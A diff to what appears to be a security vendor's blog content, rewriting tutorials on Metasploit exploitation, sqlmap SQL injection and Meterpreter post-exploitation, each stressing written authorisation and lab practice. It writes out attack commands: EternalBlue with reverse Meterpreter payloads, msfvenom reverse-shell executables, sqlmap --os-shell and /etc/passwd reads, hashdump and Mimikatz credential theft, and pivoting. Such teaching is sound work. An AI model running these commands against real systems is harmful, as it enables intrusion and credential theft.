@@ -253,81 +253,125 @@ Stay ahead of threats by continuously testing your applications against the late
   },
   "metasploit-zero-to-exploit": {
     slug: "metasploit-zero-to-exploit",
-    title: "Getting Started with Metasploit: Architecture, Workflow and Meterpreter",
+    title: "Getting Started with Metasploit: Your First Exploit",
     category: "Tutorials",
     date: "2026-01-05",
     author: "Semih Kilic",
-    excerpt: "Hands-on walkthrough of the Metasploit Framework — modules, payloads, encoders, and post-exploitation techniques.",
-    tags: ["metasploit", "exploitation", "penetration-testing", "post-exploitation"],
+    excerpt: "From an empty msfconsole to a live session: the five module types, why reverse payloads call home to your LHOST, building standalone payloads with msfvenom, and why you check before you exploit.",
+    tags: ["metasploit", "exploitation", "penetration-testing", "msfvenom"],
     content: `
-## Getting Started with Metasploit
+## What Metasploit actually is
 
-The Metasploit Framework is the world's most used penetration testing software. This tutorial walks you through from installation to your first exploit.
+Newcomers meet Metasploit as "the tool that runs exploits", which is true and also the least interesting thing about it. What makes it the framework every other pentest tool measures itself against is that it turns four separate jobs — knowing which exploit fits a target, delivering it, catching the connection that comes back, and doing something useful with that connection — into four kinds of interchangeable module that snap together. Learn how the pieces fit and you can reason about any of the thousands of modules you have never seen, instead of memorising commands.
 
-## Architecture Overview
+This guide takes you from an empty \`msfconsole\` to a live session on a lab target. What you do *with* that session — privilege escalation, credential theft, pivoting to the next host — is the subject of the companion guide on Meterpreter and post-exploitation.
 
-Metasploit's modular architecture consists of:
-- **Exploits**: Code that takes advantage of vulnerabilities
-- **Payloads**: Code that runs after exploitation (shells, Meterpreter)
-- **Auxiliaries**: Scanning, fuzzing, and information gathering modules
-- **Post-Exploitation**: Modules for privilege escalation, persistence, pivoting
-- **Encoders**: Obfuscation to evade detection
+## The five module types
 
-## Basic Workflow
+Everything in the framework is one of these, and the whole workflow is a matter of choosing one of each that you need:
+
+- **Exploits** take advantage of a specific vulnerability. \`exploit/windows/smb/ms17_010_eternalblue\` is one flaw, in one protocol, on one platform.
+- **Payloads** are the code that runs *after* the exploit lands — a shell, or the far more capable Meterpreter.
+- **Auxiliary** modules do everything that is not exploitation: port and version scanning, fuzzing, brute-forcing, protocol enumeration. You will often use an auxiliary scanner before any exploit.
+- **Post** modules run inside a session you already have, to escalate, harvest or pivot.
+- **Encoders** and **nops** reshape a payload's bytes. Their historical job was evading signature-based antivirus; against a modern EDR they rarely help on their own, and it is worth having that expectation from the start.
+
+The important idea is that exploit and payload are chosen *separately*. The same EternalBlue exploit can deliver a simple command shell, a Meterpreter session, or a payload that just adds a user — because the exploit's job ends the moment it gets code running, and the payload's job begins there.
+
+## Reverse versus bind: which way the connection goes
+
+Before the first exploit, one distinction saves a lot of confusion. A payload named \`reverse_tcp\` makes the *target* connect back to *you*; a \`bind_tcp\` payload opens a port on the target and waits for you to connect *in*. Reverse is the default for a reason: outbound connections usually survive a firewall that blocks inbound ones. This is why a reverse payload needs \`LHOST\` (your address, for the target to reach) while a bind payload needs only \`RHOST\`. Getting these backwards is the single most common reason a beginner's exploit "succeeds" but no session appears.
+
+## Your first exploit, step by step
 
 \`\`\`bash
-# Start Metasploit console
+# 1. Start the console.
 msfconsole
 
-# Search for exploits
+# 2. Find something that fits the target.
 msf6 > search type:exploit platform:windows smb
 
-# Select an exploit
+# 3. Select it. The prompt changes to show the active module.
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 
-# Show options
+# 4. See what it needs.
 msf6 exploit(ms17_010_eternalblue) > show options
 
-# Set target and payload
-msf6 > set RHOSTS 192.168.1.100
-msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 > set LHOST 192.168.1.50
+# 5. Point it at the target.
+msf6 exploit(...) > set RHOSTS 192.168.56.101
 
-# Execute
-msf6 > exploit
+# 6. Choose a payload, and tell it where to call home.
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > set LHOST 192.168.56.1
+
+# 7. Sanity-check before firing.
+msf6 exploit(...) > check
+msf6 exploit(...) > exploit
 \`\`\`
 
-## Meterpreter Post-Exploitation
+Two of these steps are the ones people skip and then regret. \`show options\` lists every required field — miss one and the exploit fails with a message that does not always name the missing field. And \`check\`, which many exploits support, asks the target whether it is likely vulnerable *without* firing the exploit. On a fragile production system, a failed EternalBlue attempt can blue-screen the host; \`check\` first is the difference between a finding and an outage you have to explain.
 
-Once you have a Meterpreter session:
+## Reading what comes back
+
+A successful run ends with a line like:
+
+\`\`\`
+[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.101:49512)
+\`\`\`
+
+If you instead see the exploit complete with no session, the usual causes are, in order: the payload could not reach \`LHOST\` (wrong address, or a firewall between you and the target), the target was patched and the exploit simply failed, or you chose a payload architecture that does not match the target — a \`x64\` payload against a 32-bit process, for instance. \`set PAYLOAD\` mismatches are quiet failures, so when in doubt, start with the generic \`windows/meterpreter/reverse_tcp\` and let the framework sort the architecture out.
+
+You do not have to hold the exploit open. \`background\` (or Ctrl+Z) drops the session into the background and returns you to the console, where \`sessions -l\` lists them and \`sessions -i 1\` resumes one.
+
+## Payloads you build ahead of time: msfvenom
+
+Not every payload is delivered by an exploit. Often you need a standalone file — something to drop on a target you already have limited access to, or to use in a phishing exercise that is inside your engagement's scope. \`msfvenom\` builds those:
 
 \`\`\`bash
-# System information
-meterpreter > sysinfo
-
-# Dump password hashes
-meterpreter > hashdump
-
-# Screenshot
-meterpreter > screenshot
-
-# Privilege escalation
-meterpreter > getsystem
-
-# Persistence
-meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50
-
-# Pivoting
-meterpreter > run autoroute -s 10.0.0.0/24
+# A Windows executable that calls back to you.
+msfvenom -p windows/x64/meterpreter/reverse_tcp \\
+  LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe
 \`\`\`
 
-## Important: Legal & Ethical Considerations
+Run it and the tool reports what it produced:
 
-**Always ensure you have written authorization before testing.** Unauthorized access to computer systems is illegal. Use dedicated lab environments or authorized bug bounty programs.
+\`\`\`
+Payload size: 509 bytes
+Final size of exe file: 7680 bytes
+Saved as: payload.exe
+\`\`\`
 
-## Conclusion
+The \`-f\` format is the whole point of msfvenom: the same payload can come out as an \`exe\`, a \`dll\`, an \`elf\` for Linux, a \`.jar\`, an \`aspx\` web shell, raw shellcode, and around forty other formats. You pick the one that fits how you will deliver it. A payload built this way needs something on your side to catch the connection — which is the next piece.
 
-Metasploit is an incredibly powerful framework. Master it in a controlled lab environment before using it in production assessments.
+## The multi/handler: catching what you sent
+
+When the payload is delivered by msfvenom rather than by a live exploit, you run a listener yourself:
+
+\`\`\`bash
+msf6 > use exploit/multi/handler
+msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(handler) > set LHOST 10.0.0.5
+msf6 exploit(handler) > set LPORT 4444
+msf6 exploit(handler) > exploit -j
+\`\`\`
+
+The payload in the handler must match the payload you built with msfvenom, down to the architecture and the \`LPORT\` — the handler is the other end of the same phone line. \`-j\` runs it as a background job so you can keep working while it waits for the call.
+
+## Practise legally, from the first command
+
+Everything above is illegal against a system you do not own or have written permission to test, and "I was learning" is not a defence. Build a lab instead — it is the fastest way to learn and the only safe one:
+
+- **Metasploitable 2/3**, VMs the Metasploit project maintains specifically as legal targets.
+- **VirtualBox or VMware** on your own machine, with a host-only network so nothing you launch can leave it.
+- A **HackTheBox** or **TryHackMe** subscription, which give you sanctioned targets and a guided path.
+
+EternalBlue against your own Metasploitable VM teaches you the same workflow you will use on a real engagement, with none of the legal exposure.
+
+## Running Metasploit without maintaining it
+
+Keeping a current Metasploit install, a payload toolkit and a lab network on your own machine is real work, and doing it is a legitimate way to learn the tool deeply. If you would rather not, CyberSec Pro runs Metasploit's modules from a browser — you choose the module and set its options on a form, see the command before it runs, and watch the output stream back. The job runs server-side in a dedicated container, one process per job, and any credentials you provide are held in memory for that job alone.
+
+Either way, the mental model is what carries over: exploit and payload are separate choices, reverse connections come back to your \`LHOST\`, and you \`check\` before you \`exploit\`. Once you have a session open, the companion guide picks up from there.
     `,
   },
   "ci-cd-pentest-automation": {
@@ -480,50 +524,131 @@ Regular wireless security assessments are essential for any organization. Combin
     category: "Tools",
     date: "2026-03-10",
     author: "Semih Kilic",
-    excerpt: "Complete guide to using SQLMap for automated SQL injection detection and exploitation.",
+    excerpt: "Why the injection technique in the first result sets the pace of the whole engagement, how to test the request the app actually accepted, and which flags will damage a live system.",
     tags: ["sqlmap", "sql-injection", "web-security", "penetration-testing"],
     content: `
-## Introduction
+## What sqlmap does that a manual test does not
 
-SQLMap is the world's most popular open-source SQL injection tool. It automates detection and exploitation of SQL injection vulnerabilities.
+You can find a SQL injection by hand: put a quote in a parameter, watch the page break, work out the query behind it. sqlmap does that too, but the reason to reach for it is not detection — it is the part *after* detection. Once it confirms an injectable parameter, it fingerprints the database, works out how to read data through the specific flaw it found, and enumerates schemas and tables without you writing a single \`UNION SELECT\`. The tedious, error-prone part is the part it automates.
 
-## Basic Scanning
+That is also why it is dangerous to point casually at a live system. sqlmap is not a scanner that looks and leaves; by default it will extract data, and with the wrong flag it will try to run commands on the host. Everything below assumes you have written authorisation for the target, and the last section is about staying inside that authorisation.
 
-- **Basic test:** sqlmap -u "https://target.com/page?id=1"
-- **POST data:** sqlmap -u "https://target.com/login" --data="user=admin&pass=123"
-- **Specific param:** sqlmap -u "https://target.com/page?id=1" -p id
+## The first command, and reading its answer
 
-## Database Enumeration
+\`\`\`
+sqlmap -u "https://target.example.com/product?id=1"
+\`\`\`
 
-- **List databases:** sqlmap -u URL --dbs
-- **List tables:** sqlmap -u URL -D mydb --tables
-- **Dump table:** sqlmap -u URL -D mydb -T users --dump
-- **Dump all:** sqlmap -u URL --dump-all
+That tests the \`id\` parameter and nothing else. sqlmap sends a series of crafted values and watches how the responses differ — a payload that changes the page one way, its logical opposite that changes it back. What you are waiting for is a line like:
 
-## Advanced Techniques
+\`\`\`
+[INFO] GET parameter 'id' is 'MySQL >= 5.6 AND time-based blind' injectable
+\`\`\`
 
-### Bypass WAF/IPS
+Read that carefully, because it tells you two things that shape everything after. The DBMS — MySQL here — decides which enumeration commands are available. And the **technique** — time-based blind — decides how slow the rest of your session will be. A \`UNION\`-based injection returns data in the page and is fast. A time-based blind injection extracts data one bit at a time by making the database sleep, and dumping a large table that way can take hours. If sqlmap reports only a time-based flaw, that is not a warning you can ignore; it is the pace of the entire engagement.
 
-- Use tamper scripts: --tamper=space2comment,between
-- Randomize user-agent: --random-agent
-- Use cookies: --cookie="session=abc123"
+## Injection points beyond the query string
 
-### OS Shell Access
+Most parameters worth testing are not in the URL.
 
-- Get interactive shell: --os-shell
-- Read local files: --file-read="/etc/passwd"
+\`\`\`
+# POST body
+sqlmap -u "https://target.example.com/login" \\
+  --data="username=admin&password=test"
 
-## Best Practices
+# A specific parameter, when the request has many
+sqlmap -u "https://target.example.com/search" \\
+  --data="q=shoes&sort=price&page=2" -p q
 
-1. Always get authorization before testing
-2. Start with less intrusive tests using --level=1 --risk=1
-3. Use --batch for automated scanning
-4. Save your session with --session for resume capability
-5. Test in a lab first to understand the tool
+# An authenticated session — the injection is usually behind the login
+sqlmap -u "https://target.example.com/account?tab=orders" \\
+  --cookie="session=8f3a...; role=user"
 
-## Conclusion
+# A value inside a header, marked with *
+sqlmap -u "https://target.example.com/" \\
+  --headers="X-Forwarded-For: 1.1.1.1*"
+\`\`\`
 
-SQLMap is essential for web application security testing. Master its capabilities and always use it responsibly.
+The single most useful input, though, is not a flag at all. Capture the real request in Burp or your browser's dev tools, save it to a file, and hand sqlmap the whole thing:
+
+\`\`\`
+sqlmap -r request.txt
+\`\`\`
+
+Now sqlmap tests with the exact headers, cookies and body the application already accepted. This solves the most common "it works by hand but sqlmap finds nothing" problem, which is almost always a missing header, a CSRF token, or a session cookie that the manual test had and the tool did not.
+
+## Level and risk: the two dials that matter
+
+\`\`\`
+sqlmap -u URL --level=1 --risk=1    # the default
+sqlmap -u URL --level=3 --risk=2    # a reasonable step up
+sqlmap -u URL --level=5 --risk=3    # everything, including the payloads that can hurt
+\`\`\`
+
+\`--level\` (1–5) widens *where* sqlmap looks: higher levels test more parameters, and crucially, levels 2 and 3 start testing cookies and headers that the default leaves alone. \`--risk\` (1–3) changes *what* it sends. This is the dial to respect. Risk 3 includes \`OR\`-based boolean payloads, and an \`OR\`-based injection into an \`UPDATE\` statement can match every row in a table — which on a live application means editing every record, not reading one. The default of \`--level=1 --risk=1\` is not timidity; it is what you run against a system you cannot afford to damage.
+
+Raise the level first when detection is coming up empty. Raise the risk only when you understand what the extra payloads do and the target can absorb the consequence.
+
+## Enumeration, from database down to rows
+
+Once a parameter is confirmed injectable, you walk down the tree:
+
+\`\`\`
+sqlmap -r request.txt --dbs                       # which databases exist
+sqlmap -r request.txt -D shopdb --tables          # tables in one of them
+sqlmap -r request.txt -D shopdb -T users --columns# columns in one table
+sqlmap -r request.txt -D shopdb -T users \\
+  -C username,password_hash --dump                # just the columns you need
+\`\`\`
+
+Notice the last command names two columns. The instinct is \`--dump\` on the whole table, or worse \`--dump-all\` across every database. Over a time-based blind injection that is the difference between a two-minute extraction and one that runs overnight and gets you noticed. Take the schema first, decide what actually proves the finding — usually a handful of rows and the columns that show the data is real — and pull only that. A penetration test demonstrates access; it does not need to exfiltrate the customer table to do so.
+
+\`--current-user\`, \`--current-db\`, \`--is-dba\` and \`--passwords\` answer "how bad is this" quickly and cheaply, and they are a better opening move than dumping anything.
+
+## When there is a WAF in the way
+
+A web application firewall that blocks obvious payloads is common, and sqlmap has room to work around it — legitimately, on a target you are authorised to test.
+
+\`\`\`
+sqlmap -r request.txt --random-agent
+sqlmap -r request.txt --tamper=space2comment,between --random-agent
+sqlmap -r request.txt --delay=1 --safe-url=https://target.example.com/ --safe-freq=10
+\`\`\`
+
+Tamper scripts rewrite payloads into forms a filter may not recognise — \`space2comment\` replaces spaces with inline comments, \`between\` rewrites \`>\` comparisons, and there are dozens more for specific filters. \`--random-agent\` avoids the default sqlmap user-agent that many WAFs block on sight. And \`--delay\` with \`--safe-url\`/\`--safe-freq\` slows the session and periodically hits a harmless page, which both reduces load and makes the traffic look less like a machine hammering one endpoint. This is evasion in the service of a sanctioned test; the same techniques against a system you do not own are simply an attack.
+
+## The commands to think twice about
+
+\`\`\`
+sqlmap -r request.txt --os-shell       # command execution on the DB host
+sqlmap -r request.txt --file-read="/etc/passwd"
+sqlmap -r request.txt --sql-shell       # an interactive SQL prompt
+\`\`\`
+
+\`--os-shell\` is where sqlmap stops reading the database and starts trying to run operating-system commands on the server behind it — by writing a payload to disk, abusing a stored procedure, or a similar path depending on the DBMS. When it works it is the strongest possible demonstration of impact. It is also the loudest thing in the tool, it writes files to the target, and it will trip any monitoring worth the name. On a real engagement, run it only when the rules of engagement explicitly permit command execution, and know that "explicitly permit" means it is written in the scope document, not that nobody said you couldn't.
+
+## Sessions, batch mode, and not repeating work
+
+\`\`\`
+sqlmap -r request.txt --batch                     # take the default at every prompt
+sqlmap -r request.txt --dbs --flush-session       # start clean, ignore the cache
+\`\`\`
+
+sqlmap caches what it learns in a per-target session file, so a second run does not re-detect an injection it already found — it picks up where it left off. \`--batch\` answers every interactive prompt with the sensible default, which is what you want in a script or a long enumeration you don't intend to babysit. Reach for \`--flush-session\` only when you have changed something about the target or the test and want sqlmap to stop trusting its cache.
+
+## A short checklist before you run it in anger
+
+- The target is in a written scope, and data extraction (and, separately, command execution) is permitted by that document.
+- You are testing with \`-r request.txt\` from a real captured request, so authentication and headers match.
+- You start at \`--level=1 --risk=1\` and raise deliberately, not reflexively.
+- You enumerate the schema before dumping, and dump the columns that prove the finding rather than the whole database.
+- You practise against a deliberately vulnerable app first — DVWA, OWASP Juice Shop, or the \`testphp.vulnweb.com\` target Acunetix publishes for exactly this — before you touch anything real.
+
+## Running it without the local install
+
+sqlmap is a Python tool and installs cleanly, and running it yourself is a fine way to work. If you would rather not manage a Python environment and a WAF-evasion toolkit on your own machine, CyberSec Pro runs sqlmap from a browser: you fill in the target and options on a form, see the exact command before it runs, and the output streams back as it happens. The scan executes server-side in a dedicated container, one process per job, and credentials you supply for an authenticated test are held in memory for that job and never written to the database, logs or backups.
+
+Whichever way you run it, the discipline is the same. Read the technique in the first result, enumerate before you dump, and never send a risk-3 payload at something you cannot afford to break.
     `,
   },
   "nmap-network-scanning": {
@@ -714,55 +839,111 @@ Either way, the thinking is the same: know what the states mean, scan the whole 
   },
   "metasploit-exploitation": {
     slug: "metasploit-exploitation",
-    title: "Metasploit Modules, Payloads and the Exploitation Workflow",
+    title: "Metasploit Post-Exploitation: Meterpreter, Privilege Escalation and Pivoting",
     category: "Tools",
     date: "2026-02-15",
     author: "Semih Kilic",
-    excerpt: "Complete walkthrough of Metasploit Framework — module types, exploit development, and post-exploitation.",
-    tags: ["metasploit", "exploitation", "penetration-testing", "msfconsole"],
+    excerpt: "What to do once you have a session: orienting with getuid, escalating by enumeration rather than repetition, harvesting credentials responsibly, and pivoting to hosts you were never exposed to.",
+    tags: ["metasploit", "post-exploitation", "meterpreter", "privilege-escalation"],
     content: `
-## Introduction
+## The session is the beginning, not the end
 
-Metasploit Framework is the world's most used penetration testing framework. It provides tools for every stage of a pentest.
+Landing an exploit is the part beginners celebrate and experienced testers treat as step one. A shell on one machine, as a low-privilege user, with no way back in if the connection drops, proves very little on its own. The value of an engagement is in what the session lets you demonstrate next: that you could become administrator, read the credentials that unlock the rest of the network, and reach systems that were never exposed to you directly. That is post-exploitation, and Meterpreter is the tool built for it.
 
-## Getting Started
+This guide assumes you already have a Meterpreter session — if you do not, the companion guide covers getting one. Everything here runs at the \`meterpreter >\` prompt.
 
-- **Start console:** msfconsole
-- **Search exploits:** search type:exploit platform:windows smb
-- **Use exploit:** use exploit/windows/smb/ms17_010_eternalblue
-- **Show options:** show options
-- **Set options:** set RHOSTS 192.168.1.100
+## Why Meterpreter, and not a plain shell
 
-## Module Types
+An exploit can hand you an ordinary command shell, and sometimes that is all you get. Meterpreter is worth choosing when you can because of *how* it runs: it lives in the memory of the process it landed in and never writes itself to disk, it speaks to you over an encrypted channel, and it exposes one consistent set of commands whether the target is Windows or Linux. A plain shell makes you fight the target's own tooling — different commands on every OS, everything written to disk, everything in the clear. Meterpreter gives you a stable platform to work from.
 
-### Exploits
-- exploit/multi/handler — Generic listener
-- exploit/windows/smb/ — Windows SMB exploits
-- exploit/linux/http/ — Linux web exploits
+## Orient before you act
 
-### Payloads
-- payload/windows/meterpreter/reverse_tcp — Windows
-- payload/linux/x64/meterpreter/reverse_tcp — Linux
-- payload/python/meterpreter/reverse_tcp — Cross-platform
+The first minute in a new session is for finding out where you are, not for firing commands:
 
-## Exploitation Workflow
+\`\`\`bash
+meterpreter > sysinfo        # OS, architecture, hostname, domain
+meterpreter > getuid         # who you are running as
+meterpreter > getpid        # which process you are living inside
+meterpreter > ipconfig       # the target's networks — note ones you can't reach yet
+\`\`\`
 
-1. Find target: search type:exploit apache
-2. Configure: set RHOSTS target.com
-3. Set payload: set PAYLOAD linux/x64/meterpreter/reverse_tcp
-4. Set listener: set LHOST attacker.com
-5. Exploit: exploit
+\`getuid\` decides your whole next move. If it already reports \`NT AUTHORITY\\SYSTEM\` or \`root\`, you skip privilege escalation entirely. If it reports an ordinary user, that is the first problem to solve. And \`ipconfig\` is where pivoting begins: a second network interface on the compromised host, on a subnet you could not touch from outside, is the map of where you go next.
 
-## Post-Exploitation
+## Getting from user to administrator
 
-- **System info:** sysinfo, getuid
-- **File ops:** download /etc/passwd, upload shell.sh
-- **Network recon:** ifconfig, route, netstat
-- **Privilege escalation:** getsystem
+\`\`\`bash
+meterpreter > getsystem
+\`\`\`
 
-## Conclusion
+\`getsystem\` tries a handful of known local privilege-escalation techniques and, on an unpatched or misconfigured host, may take you straight to SYSTEM. When it works, it is the fastest path. When it fails — and on a patched, modern system it usually does — the honest next step is enumeration, not repetition. Background the session and run a local exploit suggester:
 
-Metasploit is powerful but must be used responsibly. Master the basics in a lab first.
+\`\`\`bash
+meterpreter > background
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 > set SESSION 1
+msf6 > run
+\`\`\`
+
+That checks the session against local exploits the target may be vulnerable to and hands you a shortlist to try. Escalation on a well-maintained system is a research problem — which missing patch, which weak service permission, which misconfiguration — not a single magic command, and treating \`getsystem\` as if it always works is how beginners get stuck.
+
+## Harvesting credentials — carefully
+
+Once you are SYSTEM, credentials are the prize, because they turn one compromised host into access across the network:
+
+\`\`\`bash
+meterpreter > hashdump                 # local SAM password hashes
+meterpreter > load kiwi                 # the in-memory Mimikatz extension
+meterpreter > creds_all                 # cached credentials from memory
+\`\`\`
+
+Two cautions that matter on a real engagement. \`hashdump\` and \`kiwi\` read the most sensitive data on the machine, and on a monitored network they are exactly what an EDR is watching for — loading kiwi may be the loudest thing you do all day. And what you recover is client data under your custody: it belongs in the report and in an encrypted store, not left in your loot directory or pasted into a chat. Handle it like the liability it is.
+
+## Reaching what you could not see: pivoting
+
+This is the technique that turns a single foothold into a network compromise, and the reason \`ipconfig\` was the first thing you ran. If the host you own sits on a second subnet — say it can reach \`10.0.0.0/24\`, which you never could from outside — you can route traffic through it:
+
+\`\`\`bash
+meterpreter > run autoroute -s 10.0.0.0/24
+meterpreter > background
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > set RHOSTS 10.0.0.0/24
+msf6 > run
+\`\`\`
+
+\`autoroute\` tells the framework to send traffic for that subnet through your session, so Metasploit's own scanners and exploits now reach machines that were never exposed to you. Add a \`socks_proxy\` module on top and your other tools — a browser, sqlmap, anything that honours a SOCKS proxy — can reach the internal network too. This is the step where an assessment stops being about one server and starts being about the client's actual exposure.
+
+## Files, screenshots, and gathering evidence
+
+\`\`\`bash
+meterpreter > download C:\\Users\\Administrator\\Desktop\\notes.txt
+meterpreter > upload ./tool.exe C:\\Windows\\Temp\\report.exe
+meterpreter > screenshot
+meterpreter > pwd
+\`\`\`
+
+A pentest report is only as persuasive as its evidence. A screenshot of the target's desktop, the contents of a sensitive file, the output of \`getuid\` showing SYSTEM — these are what turn "the host was vulnerable" into "here is what an attacker would have taken". Collect proof as you go, and note the timestamps.
+
+## Persistence, and why to be reluctant with it
+
+Metasploit can install a mechanism that re-opens your session after a reboot. On a real client engagement you should be reluctant to use it, and never without explicit permission in the rules of engagement, because it means leaving a backdoor on a system you do not own. If it is in scope, it is also a cleanup obligation: whatever you install, you are responsible for removing, and an unremoved persistence mechanism is a finding against *you*. The safer habit is to document that persistence *was achievable* — you had the access to install it — rather than actually planting one.
+
+## Clean up after yourself
+
+Post-exploitation leaves traces, and a professional removes them:
+
+- Delete files you uploaded (\`rm\` inside Meterpreter, or the target's own commands).
+- Remove any persistence mechanism you were authorised to install.
+- Record every change you made — accounts, files, services — so the client can verify the environment is back to where it started.
+
+Leaving a lab dirty is a bad habit; leaving a client's production system dirty is a professional failure.
+
+## The rule that sits above all of it
+
+Every command here is illegal against a system you have not been authorised in writing to test, and the sensitive ones — credential dumping, persistence, pivoting to new hosts — are exactly the actions a rules-of-engagement document scopes explicitly. "I had a shell so I kept going" is not authorisation. Stay inside the written scope, and practise the whole chain against Metasploitable or a HackTheBox target until the workflow is muscle memory before you run it anywhere real.
+
+## Running this without the local setup
+
+Post-exploitation is where a self-managed Metasploit install earns its keep, and running it yourself is a fine way to work. If you would rather not maintain the framework and its extensions, CyberSec Pro runs Metasploit's modules from a browser — module and options on a form, the command shown before it runs, output streamed back — with each job in its own container and any credentials you supply held in memory for that job alone and never written to disk. The discipline is unchanged: orient first, escalate by enumeration rather than repetition, treat harvested credentials as client property, and clean up everything you touched.
     `,
   },
   "hashcat-password-cracking": {
